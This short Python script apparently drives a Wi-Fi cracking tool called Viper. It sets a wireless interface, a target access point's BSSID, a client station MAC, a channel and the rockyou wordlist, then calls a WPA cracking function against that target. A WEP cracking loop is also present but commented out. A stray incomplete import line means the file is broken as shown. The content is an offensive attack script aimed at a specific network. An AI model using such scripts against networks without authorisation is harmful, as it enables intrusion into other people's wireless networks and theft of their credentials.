from Viper.viper import Viper
from Viper.attack.wep import wep_crack, wep_crack_no_ivs
from Viper.attack.wpa import wpa_crack, fast_wpa_crack

from 


interface = 'wlan0'

bssid = '70:72:3C:C5:55:F3'
station = '7E:C9:59:3D:44:A0'
channel = '9'
directory = '/home/kali/Documents/Viper/results/wpa_example'
orignial_time = 60
dictionary = '/home/kali/Documents/Viper/wordlists/rockyou.txt'
ctr = 1
seconds = 15
# while ctr < 4:
#     seconds = orignial_time * ctr
#     password = wep_crack(interface, bssid, station, channel, directory, seconds, ctr)
#     if password:
#         print(password)
#         print("Password Found Using IVs")
#     else:
#         ctr += 1

# password = wep_crack_no_ivs(f'{directory}/wep', dictionary)
# print(password)

print(wpa_crack(interface, 10, bssid, station, channel, directory, dictionary, seconds))